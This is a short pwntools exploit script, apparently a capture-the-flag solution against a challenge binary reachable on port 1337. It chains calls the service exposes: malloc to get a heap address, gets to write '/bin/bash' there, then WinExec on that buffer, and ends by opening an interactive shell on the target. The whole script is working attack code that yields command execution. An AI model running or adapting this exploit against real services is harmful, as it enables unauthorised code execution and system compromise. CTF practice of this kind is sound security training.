from pwn import *

HOST = "0"
PORT = 1337
if args.LOCAL:
    io = process(["wine", "challenge.exe"])
else:
    io = remote(HOST, int(PORT))
    
io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 

io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()
print(out)
heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendline(b'msvcrt.dll')
io.sendline(b'gets')
io.sendline(str(heap_addr).encode())
io.sendline(b'/bin/bash')

io.sendline(b'kernel32.dll')
io.sendline(b'WinExec')
pause()
io.sendline(str(heap_addr).encode())

io.interactive()